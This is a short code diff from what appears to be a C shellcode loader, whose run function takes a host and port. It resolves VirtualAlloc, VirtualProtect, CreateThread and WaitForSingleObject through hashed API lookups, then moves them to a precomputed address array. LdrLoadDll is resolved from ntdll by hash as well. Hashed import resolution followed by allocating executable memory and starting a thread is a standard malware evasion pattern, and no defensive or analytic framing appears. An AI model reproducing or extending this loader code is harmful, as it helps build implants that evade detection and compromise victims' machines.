@@ -58,13 +58,20 @@ int run(const char* host, const char* port)
 		printf("error\n");
 		return 1;
 	}
+	else
+	{
+		printf("working\n");
+	}
 
 
-	// TODO: hash these string literals 
-    FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManualHash(kernel32_module, VIRTUALALLOC_HASH);
-    FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManualHash(kernel32_module, VIRTUALPROTECT_HASH);
-    FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManualHash(kernel32_module, CREATETHREAD_HASH);
-    FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManualHash(kernel32_module, WAITFORSINGLEOBJECT_HASH);
+    FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)funcAddresses[0];
+    FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)funcAddresses[1];
+    FuncCreateThread pCreateThread = (FuncCreateThread)funcAddresses[2];
+    FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)funcAddresses[3];
+	//FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManualHash(kernel32_module, VIRTUALALLOC_HASH);
+    //FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManualHash(kernel32_module, VIRTUALPROTECT_HASH);
+    //FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManualHash(kernel32_module, CREATETHREAD_HASH);
+    //FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManualHash(kernel32_module, WAITFORSINGLEOBJECT_HASH);
 
     HMODULE ntdll_module = GetModuleHandleManualHash(NTDLL_DLL_HASH);
     FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManualHash(ntdll_module, LDRLOADDLL_HASH);
